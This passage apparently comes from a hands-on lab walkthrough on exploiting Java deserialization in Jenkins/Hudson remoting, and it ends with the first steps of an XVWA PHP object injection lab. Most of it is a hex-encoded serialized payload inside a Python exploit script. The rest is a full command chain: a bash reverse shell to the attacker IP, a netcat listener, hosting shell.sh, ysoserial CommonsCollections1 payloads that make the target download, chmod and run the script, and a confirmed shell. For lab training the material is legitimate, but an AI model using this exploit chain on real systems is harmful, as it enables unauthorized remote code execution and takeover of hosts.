6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x6f\x6d\x6d\x61\x6e\x64\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x01\x4c\x00\x09\x63\x72\x65\x61\x74\x65\x64\x41\x74\x74\x00\x15\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x3b\x78\x70\x73\x72\x00\x1e\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x6f\x6d\x6d\x61\x6e\x64\x24\x53\x6f\x75\x72\x63\x65\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x01\x4c\x00\x06\x74\x68\x69\x73\x24\x30\x74\x00\x19\x4c\x68\x75\x64\x73\x6f\x6e\x2f\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2f\x43\x6f\x6d\x6d\x61\x6e\x64\x3b\x78\x72\x00\x13\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\xd0\xfd\x1f\x3e\x1a\x3b\x1c\xc4\x02\x00\x00\x78\x72\x00\x13\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x54\x68\x72\x6f\x77\x61\x62\x6c\x65\xd5\xc6\x35\x27\x39\x77\xb8\xcb\x03\x00\x04\x4c\x00\x05\x63\x61\x75\x73\x65\x74\x00\x15\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x54\x68\x72\x6f\x77\x61\x62\x6c\x65\x3b\x4c\x00\x0d\x64\x65\x74\x61\x69\x6c\x4d\x65\x73\x73\x61\x67\x65\x71\x00\x7e\x00\x03\x5b\x00\x0a\x73\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x74\x00\x1e\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x45\x6c\x65\x6d\x65\x6e\x74\x3b\x4c\x00\x14\x73\x75\x70\x70\x72\x65\x73\x73\x65\x64\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x73\x74\x00\x10\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x4c\x69\x73\x74\x3b\x78\x70\x71\x00\x7e\x00\x10\x70\x75\x72\x00\x1e\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x45\x6c\x65\x6d\x65\x6e\x74\x3b\x02\x46\x2a\x3c\x3c\xfd\x22\x39\x02\x00\x00\x78\x70\x00\x00\x00\x0c\x73\x72\x00\x1b\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x45\x6c\x65\x6d\x65\x6e\x74\x61\x09\xc5\x9a\x26\x36\xdd\x85\x02\x00\x04\x49\x00\x0a\x6c\x69\x6e\x65\x4e\x75\x6d\x62\x65\x72\x4c\x00\x0e\x64\x65\x63\x6c\x61\x72\x69\x6e\x67\x43\x6c\x61\x73\x73\x71\x00\x7e\x00\x03\x4c\x00\x08\x66\x69\x6c\x65\x4e\x61\x6d\x65\x71\x00\x7e\x00\x03\x4c\x00\x0a\x6d\x65\x74\x68\x6f\x64\x4e\x61\x6d\x65\x71\x00\x7e\x00\x03\x78\x70\x00\x00\x00\x43\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x6f\x6d\x6d\x61\x6e\x64\x74\x00\x0c\x43\x6f\x6d\x6d\x61\x6e\x64\x2e\x6a\x61\x76\x61\x74\x00\x06\x3c\x69\x6e\x69\x74\x3e\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x32\x71\x00\x7e\x00\x15\x71\x00\x7e\x00\x16\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x63\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x71\x75\x65\x73\x74\x74\x00\x0c\x52\x65\x71\x75\x65\x73\x74\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x3c\x74\x00\x1b\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x55\x73\x65\x72\x52\x65\x71\x75\x65\x73\x74\x74\x00\x10\x55\x73\x65\x72\x52\x65\x71\x75\x65\x73\x74\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x03\x08\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x68\x61\x6e\x6e\x65\x6c\x74\x00\x0c\x43\x68\x61\x6e\x6e\x65\x6c\x2e\x6a\x61\x76\x61\x74\x00\x04\x63\x61\x6c\x6c\x73\x71\x00\x7e\x00\x13\x00\x00\x00\xfa\x74\x00\x27\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x74\x00\x1c\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x2e\x6a\x61\x76\x61\x74\x00\x06\x69\x6e\x76\x6f\x6b\x65\x73\x71\x00\x7e\x00\x13\xff\xff\xff\xff\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x24\x50\x72\x6f\x78\x79\x31\x70\x74\x00\x0f\x77\x61\x69\x74\x46\x6f\x72\x50\x72\x6f\x70\x65\x72\x74\x79\x73\x71\x00\x7e\x00\x13\x00\x00\x04\xe7\x71\x00\x7e\x00\x20\x71\x00\x7e\x00\x21\x74\x00\x15\x77\x61\x69\x74\x46\x6f\x72\x52\x65\x6d\x6f\x74\x65\x50\x72\x6f\x70\x65\x72\x74\x79\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x93\x74\x00\x0e\x68\x75\x64\x73\x6f\x6e\x2e\x63\x6c\x69\x2e\x43\x4c\x49\x74\x00\x08\x43\x4c\x49\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x48\x74\x00\x1f\x68\x75\x64\x73\x6f\x6e\x2e\x63\x6c\x69\x2e\x43\x4c\x49\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x46\x61\x63\x74\x6f\x72\x79\x74\x00\x19\x43\x4c\x49\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x46\x61\x63\x74\x6f\x72\x79\x2e\x6a\x61\x76\x61\x74\x00\x07\x63\x6f\x6e\x6e\x65\x63\x74\x73\x71\x00\x7e\x00\x13\x00\x00\x01\xdf\x71\x00\x7e\x00\x2d\x71\x00\x7e\x00\x2e\x74\x00\x05\x5f\x6d\x61\x69\x6e\x73\x71\x00\x7e\x00\x13\x00\x00\x01\x86\x71\x00\x7e\x00\x2d\x71\x00\x7e\x00\x2e\x74\x00\x04\x6d\x61\x69\x6e\x73\x72\x00\x26\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x24\x55\x6e\x6d\x6f\x64\x69\x66\x69\x61\x62\x6c\x65\x4c\x69\x73\x74\xfc\x0f\x25\x31\xb5\xec\x8e\x10\x02\x00\x01\x4c\x00\x04\x6c\x69\x73\x74\x71\x00\x7e\x00\x0f\x78\x72\x00\x2c\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x24\x55\x6e\x6d\x6f\x64\x69\x66\x69\x61\x62\x6c\x65\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x19\x42\x00\x80\xcb\x5e\xf7\x1e\x02\x00\x01\x4c\x00\x01\x63\x74\x00\x16\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x3b\x78\x70\x73\x72\x00\x13\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x41\x72\x72\x61\x79\x4c\x69\x73\x74\x78\x81\xd2\x1d\x99\xc7\x61\x9d\x03\x00\x01\x49\x00\x04\x73\x69\x7a\x65\x78\x70\x00\x00\x00\x00\x77\x04\x00\x00\x00\x00\x78\x71\x00\x7e\x00\x3c\x78\x71\x00\x7e\x00\x08\x00\x00\x00\x01\x00\x00\x00\x00\x70\x73\x7d\x00\x00\x00\x02\x00\x2e\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x24\x49\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x00\x1c\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x49\x52\x65\x61\x64\x52\x65\x73\x6f\x6c\x76\x65\x78\x72\x00\x17\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x72\x65\x66\x6c\x65\x63\x74\x2e\x50\x72\x6f\x78\x79\xe1\x27\xda\x20\xcc\x10\x43\xcb\x02\x00\x01\x4c\x00\x01\x68\x74\x00\x25\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x72\x65\x66\x6c\x65\x63\x74\x2f\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x3b\x78\x70\x73\x72\x00\x27\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x00\x00\x00\x00\x00\x00\x00\x01\x03\x00\x05\x5a\x00\x14\x61\x75\x74\x6f\x55\x6e\x65\x78\x70\x6f\x72\x74\x42\x79\x43\x61\x6c\x6c\x65\x72\x5a\x00\x09\x67\x6f\x69\x6e\x67\x48\x6f\x6d\x65\x49\x00\x03\x6f\x69\x64\x5a\x00\x09\x75\x73\x65\x72\x50\x72\x6f\x78\x79\x4c\x00\x06\x6f\x72\x69\x67\x69\x6e\x71\x00\x7e\x00\x0d\x78\x70\x00\x00\x00\x00\x00\x02\x00\x73\x71\x00\x7e\x00\x0b\x71\x00\x7e\x00\x43\x74\x00\x78\x50\x72\x6f\x78\x79\x20\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x40\x32\x20\x77\x61\x73\x20\x63\x72\x65\x61\x74\x65\x64\x20\x66\x6f\x72\x20\x69\x6e\x74\x65\x72\x66\x61\x63\x65\x20\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x24\x49\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x75\x71\x00\x7e\x00\x11\x00\x00\x00\x0d\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x7d\x71\x00\x7e\x00\x24\x71\x00\x7e\x00\x25\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x89\x71\x00\x7e\x00\x24\x71\x00\x7e\x00\x25\x74\x00\x04\x77\x72\x61\x70\x73\x71\x00\x7e\x00\x13\x00\x00\x02\x6a\x71\x00\x7e\x00\x20\x71\x00\x7e\x00\x21\x74\x00\x06\x65\x78\x70\x6f\x72\x74\x73\x71\x00\x7e\x00\x13\x00\x00\x02\xa6\x74\x00\x21\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x74\x00\x16\x52\x65\x6d\x6f\x74\x65\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x4a\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x46\x71\x00\x7e\x00\x1d\x71\x00\x7e\x00\x1e\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x03\x08\x71\x00\x7e\x00\x20\x71\x00\x7e\x00\x21\x71\x00\x7e\x00\x22\x73\x71\x00\x7e\x00\x13\x00\x00\x00\xfa\x71\x00\x7e\x00\x24\x71\x00\x7e\x00\x25\x71\x00\x7e\x00\x26\x73\x71\x00\x7e\x00\x13\xff\xff\xff\xff\x71\x00\x7e\x00\x28\x70\x71\x00\x7e\x00\x29\x73\x71\x00\x7e\x00\x13\x00\x00\x04\xe7\x71\x00\x7e\x00\x20\x71\x00\x7e\x00\x21\x71\x00\x7e\x00\x2b\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x93\x71\x00\x7e\x00\x2d\x71\x00\x7e\x00\x2e\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x48\x71\x00\x7e\x00\x30\x71\x00\x7e\x00\x31\x71\x00\x7e\x00\x32\x73\x71\x00\x7e\x00\x13\x00\x00\x01\xdf\x71\x00\x7e\x00\x2d\x71\x00\x7e\x00\x2e\x71\x00\x7e\x00\x34\x73\x71\x00\x7e\x00\x13\x00\x00\x01\x86\x71\x00\x7e\x00\x2d\x71\x00\x7e\x00\x2e\x71\x00\x7e\x00\x36\x71\x00\x7e\x00\x3a\x78\x78\x75\x72\x00\x02\x5b\x42\xac\xf3\x17\xf8\x06\x08\x54\xe0\x02\x00\x00\x78\x70\x00\x00\x07\x46\xac\xed\x00\x05\x73\x72\x00\x32\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x24\x52\x50\x43\x52\x65\x71\x75\x65\x73\x74\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x04\x49\x00\x03\x6f\x69\x64\x5b\x00\x09\x61\x72\x67\x75\x6d\x65\x6e\x74\x73\x74\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x4c\x00\x0a\x6d\x65\x74\x68\x6f\x64\x4e\x61\x6d\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x5b\x00\x05\x74\x79\x70\x65\x73\x74\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x77\x08\xff\xff\xff\xfe\x00\x00\x00\x02\x78\x72\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x71\x75\x65\x73\x74\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x03\x49\x00\x02\x69\x64\x49\x00\x08\x6c\x61\x73\x74\x49\x6f\x49\x64\x4c\x00\x08\x72\x65\x73\x70\x6f\x6e\x73\x65\x74\x00\x1a\x4c\x68\x75\x64\x73\x6f\x6e\x2f\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2f\x52\x65\x73\x70\x6f\x6e\x73\x65\x3b\x77\x04\x00\x00\x00\x00\x78\x72\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x6f\x6d\x6d\x61\x6e\x64\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x01\x4c\x00\x09\x63\x72\x65\x61\x74\x65\x64\x41\x74\x74\x00\x15\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x3b\x77\x04\x00\x00\x00\x00\x78\x70\x73\x72\x00\x1e\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x6f\x6d\x6d\x61\x6e\x64\x24\x53\x6f\x75\x72\x63\x65\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x01\x4c\x00\x06\x74\x68\x69\x73\x24\x30\x74\x00\x19\x4c\x68\x75\x64\x73\x6f\x6e\x2f\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2f\x43\x6f\x6d\x6d\x61\x6e\x64\x3b\x77\x04\x00\x00\x00\x00\x78\x72\x00\x13\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\xd0\xfd\x1f\x3e\x1a\x3b\x1c\xc4\x02\x00\x00\x77\x04\xff\xff\xff\xfd\x78\x72\x00\x13\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x54\x68\x72\x6f\x77\x61\x62\x6c\x65\xd5\xc6\x35\x27\x39\x77\xb8\xcb\x03\x00\x04\x4c\x00\x05\x63\x61\x75\x73\x65\x74\x00\x15\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x54\x68\x72\x6f\x77\x61\x62\x6c\x65\x3b\x4c\x00\x0d\x64\x65\x74\x61\x69\x6c\x4d\x65\x73\x73\x61\x67\x65\x71\x00\x7e\x00\x02\x5b\x00\x0a\x73\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x74\x00\x1e\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x45\x6c\x65\x6d\x65\x6e\x74\x3b\x4c\x00\x14\x73\x75\x70\x70\x72\x65\x73\x73\x65\x64\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x73\x74\x00\x10\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x4c\x69\x73\x74\x3b\x77\x04\xff\xff\xff\xfd\x78\x70\x71\x00\x7e\x00\x10\x70\x75\x72\x00\x1e\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x45\x6c\x65\x6d\x65\x6e\x74\x3b\x02\x46\x2a\x3c\x3c\xfd\x22\x39\x02\x00\x00\x77\x04\xff\xff\xff\xfd\x78\x70\x00\x00\x00\x0b\x73\x72\x00\x1b\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x45\x6c\x65\x6d\x65\x6e\x74\x61\x09\xc5\x9a\x26\x36\xdd\x85\x02\x00\x04\x49\x00\x0a\x6c\x69\x6e\x65\x4e\x75\x6d\x62\x65\x72\x4c\x00\x0e\x64\x65\x63\x6c\x61\x72\x69\x6e\x67\x43\x6c\x61\x73\x73\x71\x00\x7e\x00\x02\x4c\x00\x08\x66\x69\x6c\x65\x4e\x61\x6d\x65\x71\x00\x7e\x00\x02\x4c\x00\x0a\x6d\x65\x74\x68\x6f\x64\x4e\x61\x6d\x65\x71\x00\x7e\x00\x02\x77\x04\xff\xff\xff\xfd\x78\x70\x00\x00\x00\x43\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x6f\x6d\x6d\x61\x6e\x64\x74\x00\x0c\x43\x6f\x6d\x6d\x61\x6e\x64\x2e\x6a\x61\x76\x61\x74\x00\x06\x3c\x69\x6e\x69\x74\x3e\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x32\x71\x00\x7e\x00\x15\x71\x00\x7e\x00\x16\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x63\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x71\x75\x65\x73\x74\x74\x00\x0c\x52\x65\x71\x75\x65\x73\x74\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x02\x39\x74\x00\x32\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x24\x52\x50\x43\x52\x65\x71\x75\x65\x73\x74\x74\x00\x1c\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\xf6\x74\x00\x27\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x71\x00\x7e\x00\x1e\x74\x00\x06\x69\x6e\x76\x6f\x6b\x65\x73\x71\x00\x7e\x00\x13\xff\xff\xff\xff\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x24\x50\x72\x6f\x78\x79\x31\x70\x74\x00\x0f\x77\x61\x69\x74\x46\x6f\x72\x50\x72\x6f\x70\x65\x72\x74\x79\x73\x71\x00\x7e\x00\x13\x00\x00\x04\xe7\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x68\x61\x6e\x6e\x65\x6c\x74\x00\x0c\x43\x68\x61\x6e\x6e\x65\x6c\x2e\x6a\x61\x76\x61\x74\x00\x15\x77\x61\x69\x74\x46\x6f\x72\x52\x65\x6d\x6f\x74\x65\x50\x72\x6f\x70\x65\x72\x74\x79\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x93\x74\x00\x0e\x68\x75\x64\x73\x6f\x6e\x2e\x63\x6c\x69\x2e\x43\x4c\x49\x74\x00\x08\x43\x4c\x49\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x48\x74\x00\x1f\x68\x75\x64\x73\x6f\x6e\x2e\x63\x6c\x69\x2e\x43\x4c\x49\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x46\x61\x63\x74\x6f\x72\x79\x74\x00\x19\x43\x4c\x49\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x46\x61\x63\x74\x6f\x72\x79\x2e\x6a\x61\x76\x61\x74\x00\x07\x63\x6f\x6e\x6e\x65\x63\x74\x73\x71\x00\x7e\x00\x13\x00\x00\x01\xdf\x71\x00\x7e\x00\x2a\x71\x00\x7e\x00\x2b\x74\x00\x05\x5f\x6d\x61\x69\x6e\x73\x71\x00\x7e\x00\x13\x00\x00\x01\x86\x71\x00\x7e\x00\x2a\x71\x00\x7e\x00\x2b\x74\x00\x04\x6d\x61\x69\x6e\x73\x72\x00\x26\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x24\x55\x6e\x6d\x6f\x64\x69\x66\x69\x61\x62\x6c\x65\x4c\x69\x73\x74\xfc\x0f\x25\x31\xb5\xec\x8e\x10\x02\x00\x01\x4c\x00\x04\x6c\x69\x73\x74\x71\x00\x7e\x00\x0f\x77\x04\xff\xff\xff\xfd\x78\x72\x00\x2c\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x24\x55\x6e\x6d\x6f\x64\x69\x66\x69\x61\x62\x6c\x65\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x19\x42\x00\x80\xcb\x5e\xf7\x1e\x02\x00\x01\x4c\x00\x01\x63\x74\x00\x16\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x3b\x77\x04\xff\xff\xff\xfd\x78\x70\x73\x72\x00\x13\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x41\x72\x72\x61\x79\x4c\x69\x73\x74\x78\x81\xd2\x1d\x99\xc7\x61\x9d\x03\x00\x01\x49\x00\x04\x73\x69\x7a\x65\x77\x04\xff\xff\xff\xfd\x78\x70\x00\x00\x00\x00\x77\x04\x00\x00\x00\x00\x78\x71\x00\x7e\x00\x39\x78\x71\x00\x7e\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x70\x00\x00\x00\x01\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x3b\x90\xce\x58\x9f\x10\x73\x29\x6c\x02\x00\x00\x77\x04\xff\xff\xff\xfd\x78\x70\x00\x00\x00\x01\x74\x00\x18\x68\x75\x64\x73\x6f\x6e\x2e\x63\x6c\x69\x2e\x43\x6c\x69\x45\x6e\x74\x72\x79\x50\x6f\x69\x6e\x74\x71\x00\x7e\x00\x24\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x72\x69\x6e\x67\x3b\xad\xd2\x56\xe7\xe9\x1d\x7b\x47\x02\x00\x00\x77\x04\xff\xff\xff\xfd\x78\x70\x00\x00\x00\x01\x74\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x74\x00\x1d\x52\x50\x43\x52\x65\x71\x75\x65\x73\x74\x28\x31\x2c\x77\x61\x69\x74\x46\x6f\x72\x50\x72\x6f\x70\x65\x72\x74\x79\x29'
print 'sending payload...'
sock.send(payload)
data = sock.recv(1024)
print('received "%s"' % data)

sock.close()
```

Step 5: Create a reverse shell payload.

Copy and paste the command into a file and save it as shell.sh.

Syntax: 
```bash
bash -i >& /dev/tcp/<lhost>/<lport> 0>&1
```

Command:
```bash
bash -i >& /dev/tcp/192.24.161.2/9999 0>&1
```

Step 6: Setup a Netcat listener that will be listening for connections on port 9999.

Command:
```bash
nc -lvp 9999
```



Step 7: Host the shell.sh file using a Python SimpleHTTPServer. In the same directory where the file is present, execute the below.

Command:
```bash
python -m SimpleHTTPServer 8888
```



Step 8: Generate a payload with a ysoserial file and make the target machine download the shell.sh file from attacker machine.

Command:
```bash
java -jar ~/Desktop/tools/ysoserial/ysoserial-master-SNAPSHOT.jar CommonsCollections1 "curl http://192.24.161.2:8888/shell.sh -o /tmp/shell.sh" > /root/payload.out
```



Step 9: Execute the python exploit code.

Usage: python exploit.py <host> <port> </path/to/payload>

Command:
```bash
python exploit.py 192.24.161.3 8080 /root/payload.out
```


This result from the python server shows that shell.sh file is downloaded by the target machine, and the payload is working as expected.



We have to run the python exploit two more times to execute the bash script in the target machine.

Step 10: Generate a payload again for making the downloaded shell.sh file executable.

Command:
```bash
java -jar ~/Desktop/tools/ysoserial/ysoserial-master-SNAPSHOT.jar CommonsCollections1 "chmod +x /tmp/shell.sh" > /root/payload.out
```



Step 11: Execute the python code again to send the payload for making shell.sh file executable.

Command:
```bash
python exploit.py 192.24.161.3 8080 /root/payload.out
```

Step 12: Generate a payload for executing the downloaded shell.sh file again.

Command:
```bash
java -jar ~/Desktop/tools/ysoserial/ysoserial-master-SNAPSHOT.jar CommonsCollections1 "/bin/bash /tmp/shell.sh" > /root/payload.out
```

Step 13: Execute the python code again to send the payload to the target machine for executing shell.sh file.

Command:
```bash
python exploit.py 192.24.161.3 8080 /root/payload.out
```


Step 14: Open the terminal where the Netcat was listening. The shell should arrive on the Netcat listener.

Check the id by the following command.

Command:
```bash
id
```


> Successfully achieved remote code execution.

## Lab 3
Solution

Step 1: Open the lab link to access the Kali GUI instance.


Step 2: Check if the provided machine/domain is reachable.

Command:
```bash
ping -c3 demo.ine.local
```


The provided machine is reachable.

Step 3: Check open ports on the provided machine.

Command:
```bash
nmap -sS -sV demo.ine.local
```


Port 80 (Apache webserver) and 3306 (MySQL server) are open on the target machine.

Step 4: Open the browser to inspect the hosted website.
```bash
URL: http://demo.ine.local
```

> An instance of XVWA is hosted on the Apache webserver.

Step 5: Open PHP Object Injection page.

Select PHP Object Injection from the available set of vulnerabilities:

Step 6: Interact with the vulnerable page.
```bash
Press the CLICK HERE button and notice the resulting URL:
```

You should see the following URL:

http://demo.ine.local/xvwa/vulnerabilities/php_object_injection/?r=a:2:{i:0;s:4:"XVWA";i:1;s:33:"Xtreme Vulnerable Web Application";}

